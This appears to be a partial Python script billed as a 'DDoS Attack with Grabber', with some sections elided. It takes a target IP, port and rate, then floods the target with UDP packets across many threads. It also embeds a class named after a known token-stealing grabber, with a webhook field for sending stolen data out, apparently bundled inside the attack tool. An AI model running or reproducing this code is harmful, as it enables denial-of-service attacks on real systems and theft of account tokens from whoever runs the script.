...
#888888 888888 888888 88""Yb 88b 88    db    88     .dP"Y8 
#88__     88   88__   88__dP 88Yb88   dPYb   88     `Ybo." 
#88""     88   88""   88"Yb  88 Y88  dP__Yb  88  .o o.`Y8b 
#888888   88   888888 88  Yb 88  Y8 dP""""Yb 88ood8 8bodP' 

print("DDoS Attack with Grabber")
print("If you have any issues post a thread on https://github.com/EternalsDev/Grabber-DoS-Python/issues")
print("""
[AUTHOR] EternalsDev | 3732n415
[GITHUB] https://github.com/EternalsDev
""")

ipaddress = str(input("IP Address: "))
port = int(input("Port: "))
option = str(input("Choose y / n: "))
pps = int(input("Packet Per Second: "))
threads = int(input("Min 9000: "))

class Hazard_Token_Grabber_V2:
    def __init__(self):
        self.webhook = "" #replace WEBHOOK_HERE with your webhook
...
def flood():
	...
	while True:
		try:
			...
			addr = (str(ipaddress),int(port))
			for x in range(pps):
				s.sendto(data,addr)
			print("Sending attack to", ipaddress, "| Port", port)
		except:
			print("Error while sending attack")
...
for y in range(threads):
	if choice == 'y':
		...
		th = threading.Thread(target = flood2py)
		th.start()
